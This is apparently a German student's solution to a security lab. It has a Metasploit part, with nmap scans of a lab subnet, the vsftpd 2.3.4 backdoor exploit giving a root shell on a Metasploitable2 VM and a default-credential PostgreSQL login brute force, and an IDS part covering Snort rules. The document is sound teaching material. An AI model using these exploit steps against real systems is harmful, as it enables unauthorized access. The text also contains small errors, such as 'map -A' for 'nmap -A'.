# Lösung des vierten Labors

## Übungsblatt Metasploit

## Aufgabe 1

1.  Vorbereitung
2.  Informationsbeschaffung
3.  Bewertung der Informationen / Risikoanalyse
4.  Aktive Eindringversuche
5.  Abschlussanalyse / Nacharbeiten / Clean-up

## Aufgabe 2

Penetrationstest, bei dem der Tester keine Information im voraus über das  
zu testende Netz erhält.

Penetrationstest, bei dem der Tester vorab Informationen über das zu  
testende Netz erhält.

## Aufgabe 3

1.  Exploits: Dieses Modul nutzt eine spezifische Sicherheitslücke in einem Zielsystem aus, um dort unberechtigten Zugriff zu erlangen.
2.  Payloads:  Der Payload ist der eigentliche Schadcode, der nach einem erfolgreichen Exploit auf dem Zielsystem ausgeführt wird, um beispielsweise eine interaktive Konsole (Shell) zu öffnen.
3.  Auxiliary: Diese Hilfsmodule führen unterstützende Aufgaben ohne direkten Einbruch durch, wie das Scannen von Ports, das Erkennen von Diensten oder das Aufspüren von Schwachstellen.
4.  Post: Post-Exploitation-Module werden auf bereits kompromittierten Systemen eingesetzt, um Daten zu stehlen, Rechte zu erweitern oder tiefer in das Netzwerk vorzudringen.

`**use**`: Wählt ein bestimmtes Metasploit-Modul (z. B. einen Exploit oder ein Auxiliary-Modul) aus und lädt es für die aktive Nutzung.

`**info**`: Zeigt detaillierte Informationen, Beschreibungen und Referenzen zum aktuell ausgewählten Modul an.

`**show options**`: Listet alle verfügbaren und erforderlichen Einstellungen (wie Ziel-IP oder Port) für das geladene Modul auf.

`**set**`: Weist einer bestimmten Option oder Variablen innerhalb des Moduls einen konkreten Wert zu (z. B. `set RHOSTS 192.168.1.1`).

`**exploit**`: Startet die Ausführung des konfigurierten Moduls, um den eigentlichen Angriff oder Scan auf das Zielsystem zu beginnen.

## Aufgabe 4

Das **Principle of Least Privilege** (Prinzip der minimalen Rechtevergabe) besagt, dass Benutzer und Programme nur die minimalen Rechte erhalten, die sie für ihre aktuelle Aufgabe zwingend benötigen, um im Schadensfall den potenziellen Missbrauch zu begrenzen.

## Aufgabe 5

**Meterpreter** ist ein fortschrittlicher Metasploit-Payload, der komplett im Arbeitsspeicher des Zielsystems läuft und einem Angreifer mächtige, schwer entdeckbare Funktionen zur interaktiven Fernsteuerung bietet.

Der wesentliche Unterschied ist, dass ein **Staged Payload** in zwei Schritten arbeitet und zuerst einen winzigen "Stager" schickt, der den eigentlichen Schadcode nachlädt, während ein **Non-Staged Payload** (Inline) den gesamten Schadcode in einem einzigen, größeren Paket direkt an das Zielsystem sendet.

## Aufgabe 6

`sudo nmap -sP 172.22.180.0/24`

> Starting Nmap 4.53 ( http://insecure.org ) at 2026-06-03 17:06 EDT  
> Host 172.22.180.1 appears to be up.  
> MAC Address: 0C:99:9F:32:00:01 (Unknown)  
> Host 172.22.180.10 appears to be up.  
> MAC Address: 0C:7E:A1:5F:00:00 (Unknown)  
> Host 172.22.180.12 appears to be up.  
> MAC Address: 86:43:89:2E:36:06 (Unknown)  
> Host 172.22.180.13 appears to be up.  
> MAC Address: 5A:3B:27:26:1E:25 (Unknown)  
> Host 172.22.180.30 appears to be up.  
> MAC Address: 52:76:78:33:59:55 (Unknown)  
> Host 172.22.180.99 appears to be up.  
> MAC Address: FA:10:51:00:62:18 (Unknown)  
> Host 172.22.180.101 appears to be up.  
> Host 172.22.180.102 appears to be up.  
> MAC Address: C2:A3:1C:75:BD:E6 (Unknown)  
> Host 172.22.180.201 appears to be up.  
> MAC Address: BE:44:E3:1B:6A:45 (Unknown)  
> Host 172.22.180.202 appears to be up.  
> MAC Address: FA:10:51:00:62:18 (Unknown)  
> Host 172.22.180.203 appears to be up.  
> MAC Address: 66:BB:70:F6:E1:96 (Unknown)  
> Host 172.22.180.204 appears to be up.  
> MAC Address: D2:A1:4B:D6:E0:1D (Unknown)  
> Nmap done: 256 IP addresses (12 hosts up) scanned in 42.174 seconds  

Besonderheit vom Stealth ist der TCP Handshake. Normalerweise Sync-Sync-Ack-Ack. Bei Steal aber kein letztes Ack sondern sofort reset damit die Verbindung nicht in den Server logs auftraucht.

Für alle im Netzwerk:

`sudo nmap -sP 172.22.180.0/24`

**Den anzufreifenden Rechner finden mit dem offenen Port:**

netbios-ssn port 139

`nmap -p 139 172.22.180.0/24`

> Interesting ports on 172.22.180.1:  
> PORT    STATE  SERVICE  
> 139/tcp closed netbios-ssn  
> MAC Address: 0C:99:9F:32:00:01 (Unknown)
> 
> Interesting ports on 172.22.180.10:  
> PORT    STATE  SERVICE  
> 139/tcp closed netbios-ssn  
> MAC Address: 0C:7E:A1:5F:00:00 (Unknown)
> 
> Interesting ports on 172.22.180.12:  
> PORT    STATE  SERVICE  
> 139/tcp closed netbios-ssn  
> MAC Address: 86:43:89:2E:36:06 (Unknown)
> 
> Interesting ports on 172.22.180.13:  
> PORT    STATE  SERVICE  
> 139/tcp closed netbios-ssn  
> MAC Address: 5A:3B:27:26:1E:25 (Unknown)
> 
> Interesting ports on 172.22.180.30:  
> PORT    STATE  SERVICE  
> 139/tcp closed netbios-ssn  
> MAC Address: 52:76:78:33:59:55 (Unknown)
> 
> Interesting ports on 172.22.180.99:  
> PORT    STATE  SERVICE  
> 139/tcp closed netbios-ssn  
> MAC Address: FA:10:51:00:62:18 (Unknown)
> 
> **Interesting ports on 172.22.180.101:**  
> **PORT    STATE SERVICE**  
> **139/tcp open  netbios-ssn**
> 
> Interesting ports on 172.22.180.102:  
> PORT    STATE  SERVICE
> 
> 139/tcp closed netbios-ssn  
> MAC Address: C2:A3:1C:75:BD:E6 (Unknown)
> 
> Interesting ports on 172.22.180.201:  
> PORT    STATE  SERVICE  
> 139/tcp closed netbios-ssn  
> MAC Address: BE:44:E3:1B:6A:45 (Unknown)
> 
> Interesting ports on 172.22.180.202:  
> PORT    STATE  SERVICE  
> 139/tcp closed netbios-ssn  
> MAC Address: FA:10:51:00:62:18 (Unknown)
> 
> Interesting ports on 172.22.180.203:  
> PORT    STATE    SERVICE  
> 139/tcp filtered netbios-ssn  
> MAC Address: 66:BB:70:F6:E1:96 (Unknown)
> 
> Interesting ports on 172.22.180.204:  
> PORT    STATE  SERVICE  
> 139/tcp closed netbios-ssn  
> MAC Address: D2:A1:4B:D6:E0:1D (Unknown)

IP Adresse des zu angreifenden Geräts ist: **172.22.180.101.**

`nmap -sS -sV -O **172.22.180.101**`

**SyncScan / StealthScan für zum Beispiel HTTP oder SSH, ScanVersion um die Version heauszufinden und -O um das Betriebssystemm herauszufinden**

> oot@metasploitable2:/# nmap -sS -sV -O 172.22.180.101
> 
> Starting Nmap 4.53 ( http://insecure.org ) at 2026-06-03 17:37 EDT  
> Interesting ports on 172.22.180.101:  
> Not shown: 1694 closed ports  
> PORT     STATE SERVICE      VERSION  
> 21/tcp   open  ftp          vsftpd 2.3.4  
> 22/tcp   open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)  
> 23/tcp   open  telnet?  
> 25/tcp   open  smtp?  
> 80/tcp   open  http         Apache httpd 2.2.8 ((Ubuntu) DAV/2)  
> 111/tcp  open  rpcbind       2 (rpc #100000)
> 
> 139/tcp  open  netbios-ssn  Samba smbd 3.X (workgroup: WORKGROUP)  
> 445/tcp  open  netbios-ssn  Samba smbd 3.X (workgroup: WORKGROUP)  
> 512/tcp  open  exec?  
> 513/tcp  open  login?  
> 514/tcp  open  shell?  
> 1524/tcp open  nessus       Nessus Daemon (NTP v1.0)  
> 2121/tcp open  ccproxy-ftp?  
> 3306/tcp open  mysql?  
> 3632/tcp open  distccd      distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))  
> 5432/tcp open  postgresql   PostgreSQL DB  
> 5900/tcp open  vnc          VNC (protocol 3.3)  
> 6000/tcp open  X11           (access denied)  
> 6667/tcp open  irc          Unreal ircd  
> 8009/tcp open  ajp13?  
> No exact OS matches for host (If you know what OS is running on it, see http://insecure.org/nmap/submit/ ).  
> TCP/IP fingerprint:  
> OS:SCAN(V=4.53%D=6/3%OT=21%CT=1%CU=32036%PV=Y%DS=0%G=Y%TM=6A209F4B%P=i686-p  
> OS:c-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%II=I%TS=A)OPS(O1=MFFD7ST11NW7%  
> OS:O2=MFFD7ST11NW7%O3=MFFD7NNT11NW7%O4=MFFD7ST11NW7%O5=MFFD7ST11NW7%O6=MFFD  
> OS:7ST11)WIN(W1=FFCB%W2=FFCB%W3=FFCB%W4=FFCB%W5=FFCB%W6=FFCB)ECN(R=Y%DF=Y%T  
> OS:=40%W=FFD7%O=MFFD7NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)  
> OS:T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=  
> OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0  
> OS:%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%TOS=C  
> OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUL=G%RUD=G)IE(R=Y%DFI=N%T=40  
> OS:%TOSI=S%CD=S%SI=S%DLI=S)
> 
> Uptime: 25.258 days (since Sat May  9 11:28:43 2026)  
> Network Distance: 0 hops  
> Service Info: Host: irc.Metasploitable.LAN; OSs: Unix, Linux
> 
> Host script results:  
> |\_ Discover OS Version over NetBIOS and SMB: Unix
> 
> OS and Service detection performed. Please report any incorrect results at http://insecure.org/nmap/submit/ .  
> Nmap done: 1 IP address (1 host up) scanned in 153.746 seconds  
> root@metasploitable2:/#   
> root@metasploitable2:/# 

```
nmap --script=smb-enum-users -p 445 172.22.180.101
```

`search vsftpd`

`use 0`

`set RHOSTS 172.22.180.101`

### Was bewirkt dieser Exploit?

Der Exploit nutzt die eingebaute Backdoor:

1.  Sendet einen Login-Versuch mit Benutzername `USER backdoor:)`
2.  Der Daemon erkennt `:)` → öffnet **Port 6200** auf dem Opfer
3.  Metasploit verbindet sich mit Port 6200
4.  Du erhältst eine **Root-Shell** auf dem Zielsystem (da vsftpd als root läuft)

`use 9`

LOGIN Exploit

`set RHOSTS 172.22.180.101`

`set USER_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt`

`set PASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt`

Login erfolgreich username:postgres pw:postgres

## Übungsblatt IDS

1)

### 1\. Nach Einsatzort

**NIDS (Network-based):** Überwacht den **gesamten Datenverkehr** im Netzwerk. Erkennt Angriffe auf dem Weg zum Ziel, scheitert aber oft an verschlüsselten Daten.

**HIDS (Host-based):** Überwacht **einzelne Geräte** (Server/PCs) und deren Logdateien. Sieht auch verschlüsselte Daten, muss aber überall separat installiert werden.

### 2\. Nach Erkennungsmethode

**Signaturbasiert:** Vergleicht Daten mit einer Datenbank bekannter Angriffe (wie ein Virenscanner). **Vorteil:** Kaum Fehlalarme. **Nachteil:** Blind für neue Bedrohungen (Zero-Days).

**Anomaliebasiert:** Lernt das Normalverhalten und schlägt bei Abweichungen Alarm. **Vorteil:** Erkennt neue Angriffe. **Nachteil:** Viele Fehlalarme bei ungewohntem, aber harmlosem Verhalten.

2)

### 1\. Der Sensor (Datenquelle / Daten-Sammler)

**Funktion:** Der Sensor ist das „Auge und Ohr“ des IDS. Er sammelt die Rohdaten direkt an der Quelle.

**Arbeitsweise:** Im Netzwerk (NIDS) kopiert er den fließenden Datenverkehr; auf einem Host (HIDS) liest er Logdateien, Systemaufrufe oder Dateiänderungen. Er selbst bewertet nichts, sondern leitet die Daten nur weiter.

### 2\. Die Analyzer-Engine (Analyse-Einheit)

**Funktion:** Das „Gehirn“ des Systems. Hier findet die eigentliche Erkennung statt.

**Arbeitsweise:** Die Engine nimmt die Daten des Sensors entgegen und prüft sie mithilfe der Erkennungsmethode (z. B. Abgleich mit einer Signaturdatenbank oder Prüfung auf Anomalien). Stellt sie etwas Verdächtiges fest, generiert sie ein Event oder einen Alarm.

### 3\. Die Konsole (Management- & Alarmierungs-Einheit)

**Funktion:** Die Schnittstelle zum menschlichen Administrator (UI).

**Arbeitsweise:** Sie nimmt die Alarme der Analyzer-Engine entgegen, bereitet sie visuell auf (Dashboards) und benachrichtigt das Sicherheitsteam (z. B. per E-Mail, SMS oder SIEM-System), damit dieses auf den Angriff reagieren kann.

3)

**IDS (Detection = Erkennung):** Der **Beobachter**. Es liest eine Kopie des Datenverkehrs mit, schlägt bei Gefahr **nur Alarm** und loggt den Vorfall. Der Datenfluss wird nicht unterbrochen. (Risiko: Erkennt Angriffe, verhindert sie aber nicht).

**IPS (Prevention = Abwehr):** Der **Türsteher**. Es sitzt direkt _im_ Datenstrom. Erkennt es eine Bedrohung, **blockiert es den Datenverkehr sofort** (z. B. durch das Sperren einer IP-Adresse). (Risiko: Bei einem Fehlalarm wird auch sauberer Datenverkehr blockiert).

4)

### False Positives (Fehlalarme)

Das System schlägt bei harmlosem Datenverkehr Alarm.

**Problem bei IDS:** **Alarm-Müdigkeit (Alert Fatigue)**. Die Admins werden mit Warnungen überschwemmt, stumpfen ab und übersehen irgendwann den einen echten, gefährlichen Alarm. Zudem wird wertvolle Arbeitszeit verschwendet.

**Problem bei IPS:** **Betriebsstörung**. Da ein IPS aktiv blockiert, sperrt es bei einem Fehlalarm plötzlich wichtige Dienste, Kunden oder Mitarbeiter aus (Business Downtime).

### False Negatives (Übersehene Angriffe)

Ein echter Angriff findet statt, aber das System bleibt stumm.

**Problem:** **Sicherheitsrisiko**. Der Angreifer dringt unbemerkt ein, kann Daten stehlen oder Schadsoftware installieren, während sich das Unternehmen in trügerischer Sicherheit wiegt.

**Kurz:** \* Zu viele _False Positives_ blockieren die Arbeit und nerven die Admins.

5)

a)

Bei einer Standardinstallation von **Snort 2** befinden sich die Konfigurationsdatei und die Regeln an den folgenden Pfaden:

| Datei-/Verzeichnistyp | Pfad (Standard) | Beschreibung |
| --- | --- | --- |
| **Konfigurationsdatei** | `/etc/snort/snort.conf` | Die zentrale Datei, in der das gesamte Verhalten von Snort gesteuert wird, inklusive der Einbindung der Regelverzeichnisse. |
| **Regeln** | `/etc/snort/rules/` | Dieses Verzeichnis enthält die einzelnen Regeldateien (z.B. `snort.rules`), die von der `snort.conf` referenziert werden. |

b)

`**/var/log/snort/alert**`: Enthält die generierten Alerts im Klartext (ASCII-Format). In diesem Fall wird auf die Standard-Ausgabe "alert\_full" zurückgegriffen.

`**/var/log/snort/**`: Das Verzeichnis, in dem Snort bei Bedarf zusätzliche Log-Dateien erstellt, z. B. für detaillierte Paket-Logs im Klartext- oder Binärformat.

c)

Die Datei `local.rules` dient bei Snort 2 dazu, **eigene, benutzerdefinierte Regeln** zu speichern.

6)

\<Aktion> \<Protokoll> \<Quell-IP> \<Quell-Port> \<Richtung> \<Ziel-IP> \<Ziel-Port> (\<Optionen>; ...)

| Feld | Bedeutung | Beispiele |
| --- | --- | --- |
| **Aktion** | Was bei einem Treffer passiert | `alert`, `log`, `pass`, `drop`, `reject` |
| **Protokoll** | Netzwerkprotokoll | `tcp`, `udp`, `icmp`, `ip` |
| **Quell-IP** | Absenderadresse | `192.168.1.1`, `10.0.0.0/24`, `any` |
| **Quell-Port** | Absenderport | `80`, `1:1024`, `any` |
| **Richtung** | Flussrichtung | `->` (hin), `<>` (bidirektional) |
| **Ziel-IP** | Empfängeradresse | `10.0.0.1`, `any` |
| **Ziel-Port** | Empfängerport | `443`, `any` |
| **Optionen** | Zusätzliche Bedingungen & Metadaten | `msg:"..."`; `content:"..."`; `sid:1000001`; `rev:1`; |

7)

a)

`alert icmp any any -> $HOME_NET any (msg:"ICMP Ping erkannt"; itype:8; sid:1000001; rev:1;)`

b)

```
snort -q -A console -i eth0 -c /etc/snort/snort.conf
```

**Flags erklärt:**

*   `-q` – Quiet-Modus (unterdrückt Banner/Statistiken)
*   `-A console` – Alarme direkt in der Konsole ausgeben
*   `-i eth0` – Netzwerk-Interface (ggf. anpassen)
*   `-c /etc/snort/snort.conf` – Pfad zur Konfigurationsdatei

c)

```
map -A 172.22.180.0/24
```

*   `-A` aktiviert OS-Erkennung, Versions-Scan, Script-Scan und Traceroute
*   Das Subnetz aus dem Netzwerkplan anpassen (hier z. B. `172.22.180.0/24`)

d)

Ja, es wird eine Ausgabe angezeigt. Das Format sieht z. B. so aus:

```
06/04-10:23:41.123456  [**] [1:1000001:1] ICMP Ping erkannt [**] 
[Priority: 0] {ICMP} 172.22.180.10 -> 172.22.180.204
```

**Entnehmbare Informationen:**

*   Zeitstempel des Ereignisses
*   Regel-ID (SID) und Revisionsnummer
*   Alarmmeldung (`msg`)
*   Protokoll
*   Quell- und Ziel-IP-Adresse